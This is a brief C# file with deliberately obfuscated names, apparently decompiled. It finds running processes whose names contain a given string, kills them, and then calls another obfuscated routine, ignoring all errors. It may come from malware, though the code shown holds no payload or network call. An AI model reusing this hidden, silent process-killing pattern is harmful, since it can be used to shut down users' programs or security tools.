using System;
using System.Diagnostics;

namespace xNvWsvlcqg;

public sealed class XimPaNZomYDvv
{
	public static bool tkVuTnWactpRN(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void FArPughFaif(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (tkVuTnWactpRN(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					BhIlEyPUpxxiJj.FGpyJwxPUuvcwh();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
